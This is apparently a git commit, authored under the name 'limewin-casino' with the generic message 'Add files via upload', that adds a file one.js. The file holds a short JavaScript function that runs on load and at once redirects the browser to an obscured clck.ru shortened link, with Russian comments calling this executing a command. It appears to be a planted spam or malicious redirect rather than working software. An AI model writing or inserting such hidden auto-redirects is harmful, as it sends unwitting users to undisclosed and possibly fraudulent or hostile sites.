14b4109faf41a0499d669bbb9ab3a52bcaf0c212
limewin-casino <bratvasiut@gmail.com>
2025-01-25 15:46:10 +0300

    Add files via upload

---
+++ one.js
@@ -0,0 +1,6 @@
+function executeRun() {
+  const url = "https://clck.ru/365H9h"; // URL для выполнения команды
+  window.location.href = url; // Выполнение перехода на указанный сайт
+}
+
+executeRun(); 
